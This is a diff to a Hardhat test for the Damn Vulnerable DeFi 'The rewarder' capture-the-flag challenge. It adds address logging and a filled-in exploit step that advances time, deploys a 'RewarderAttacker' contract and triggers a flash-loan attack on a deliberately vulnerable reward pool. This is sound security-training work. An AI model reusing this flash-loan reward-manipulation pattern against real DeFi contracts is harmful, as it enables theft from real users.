@@ -1,4 +1,4 @@
-const { ethers } = require('hardhat');
+const { ethers, tracer } = require('hardhat');
 const { expect } = require('chai');
 
 describe('[Challenge] The rewarder', function () {
@@ -14,6 +14,15 @@ describe('[Challenge] The rewarder', function () {
         [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
         users = [alice, bob, charlie, david];
 
+        if (tracer) {
+            tracer.nameTags[deployer.address] = "Deployer";
+            tracer.nameTags[alice.address] = "Alice";
+            tracer.nameTags[bob.address] = "Bob";
+            tracer.nameTags[charlie.address] = "Charlie";
+            tracer.nameTags[david.address] = "David";
+            tracer.nameTags[attacker.address] = "Attacker";
+        }
+
         const FlashLoanerPoolFactory = await ethers.getContractFactory('FlashLoanerPool', deployer);
         const TheRewarderPoolFactory = await ethers.getContractFactory('TheRewarderPool', deployer);
         const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
@@ -23,12 +32,23 @@ describe('[Challenge] The rewarder', function () {
         this.liquidityToken = await DamnValuableTokenFactory.deploy();
         this.flashLoanPool = await FlashLoanerPoolFactory.deploy(this.liquidityToken.address);
 
+        if (tracer) {
+            tracer.nameTags[this.flashLoanPool.address] = "FlashLoanPool";
+            tracer.nameTags[this.liquidityToken.address] = "LiquidityToken";
+        }
+
         // Set initial token balance of the pool offering flash loans
         await this.liquidityToken.transfer(this.flashLoanPool.address, TOKENS_IN_LENDER_POOL);
 
         this.rewarderPool = await TheRewarderPoolFactory.deploy(this.liquidityToken.address);
-        this.rewardToken = await RewardTokenFactory.attach(await this.rewarderPool.rewardToken());
-        this.accountingToken = await AccountingTokenFactory.attach(await this.rewarderPool.accToken());
+        this.rewardToken = RewardTokenFactory.attach(await this.rewarderPool.rewardToken());
+        this.accountingToken = AccountingTokenFactory.attach(await this.rewarderPool.accToken());
+
+        if (tracer) {
+            tracer.nameTags[this.rewarderPool.address] = "RewarderPool";
+            tracer.nameTags[this.rewardToken.address] = "RewardToken";
+            tracer.nameTags[this.accountingToken.address] = "AccountingToken";
+        }
 
         // Alice, Bob, Charlie and David deposit 100 tokens each
         for (let i = 0; i < users.length; i++) {
@@ -45,7 +65,7 @@ describe('[Challenge] The rewarder', function () {
 
         // Advance time 5 days so that depositors can get rewards
         await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
-        
+
         // Each depositor gets 25 reward tokens
         for (let i = 0; i < users.length; i++) {
             await this.rewarderPool.connect(users[i]).distributeRewards();
@@ -57,20 +77,46 @@ describe('[Challenge] The rewarder', function () {
 
         // Attacker starts with zero DVT tokens in balance
         expect(await this.liquidityToken.balanceOf(attacker.address)).to.eq('0');
-        
+
         // Two rounds should have occurred so far
         expect(
             await this.rewarderPool.roundNumber()
         ).to.be.eq('2');
+
+        console.log("FlashLoanPool:   %s", this.flashLoanPool.address);
+        console.log("LiquidityToken:  %s", this.liquidityToken.address);
+        console.log("RewarderPool:    %s", this.rewarderPool.address);
+        console.log("RewardToken:     %s", this.rewardToken.address);
+        console.log("AccountingToken: %s", this.accountingToken.address);
+        console.log("Deployer:        %s", deployer.address);
+        console.log("Alice:           %s", alice.address);
+        console.log("Bob:             %s", bob.address);
+        console.log("Charlie:         %s", charlie.address);
+        console.log("David:           %s", david.address);
+        console.log("Attacker:        %s", attacker.address);
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // Advance time 5 days so that depositors can get rewards
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+
+        const RewardAttackerFactory = await ethers.getContractFactory("RewarderAttacker", attacker);
+        const attackerContract =
+            await RewardAttackerFactory.deploy(
+                this.rewarderPool.address,
+                this.flashLoanPool.address,
+                this.liquidityToken.address,
+                this.rewardToken.address,
+                attacker.address);
+
+        await attackerContract.attack(TOKENS_IN_LENDER_POOL);
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-        
+
         // Only one round should have taken place
         expect(
             await this.rewarderPool.roundNumber()
@@ -80,12 +126,12 @@ describe('[Challenge] The rewarder', function () {
         for (let i = 0; i < users.length; i++) {
             await this.rewarderPool.connect(users[i]).distributeRewards();
             let rewards = await this.rewardToken.balanceOf(users[i].address);
-            
+
             // The difference between current and previous rewards balance should be lower than 0.01 tokens
             let delta = rewards.sub(ethers.utils.parseEther('25'));
             expect(delta).to.be.lt(ethers.utils.parseUnits('1', 16))
         }
-        
+
         // Rewards must have been issued to the attacker account
         expect(await this.rewardToken.totalSupply()).to.be.gt(ethers.utils.parseEther('100'));
         let rewards = await this.rewardToken.balanceOf(attacker.address);
